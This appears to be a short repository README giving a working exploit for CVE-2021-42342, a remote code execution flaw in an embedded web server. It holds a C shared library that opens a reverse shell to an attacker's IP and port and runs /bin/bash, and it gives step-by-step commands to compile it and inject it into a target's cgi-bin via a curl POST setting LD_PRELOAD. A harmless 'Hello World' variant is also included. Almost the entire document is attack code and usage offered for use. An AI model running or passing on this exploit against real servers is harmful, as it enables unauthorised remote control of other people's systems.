# CVE-2021-42342
CVE-2021-42342 RCE


POC1:just prints 
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello World!\n", 14);
}
```

POC2: reverse shell
```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

char *server_ip="***";
uint32_t server_port=7777;

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void) 
{
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in attacker_addr = {0};
  attacker_addr.sin_family = AF_INET;
  attacker_addr.sin_port = htons(server_port);
  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
  if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
    exit(0);
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);
  execve("/bin/bash", 0, 0);
}
```

usage:

step1:
`gcc hack.c -fPIC -shared -o poc.so` 

step2:
`curl -X POST  http://[TARGET]/cgi-bin/ -F "LD_PRELOAD=/proc/self/fd/0" -F file='@poc.so;encoder=base64'`

from:
- https://github.com/kimusan/goahead-webserver-pre-5.1.5-RCE-PoC-CVE-2021-42342-
- https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg 
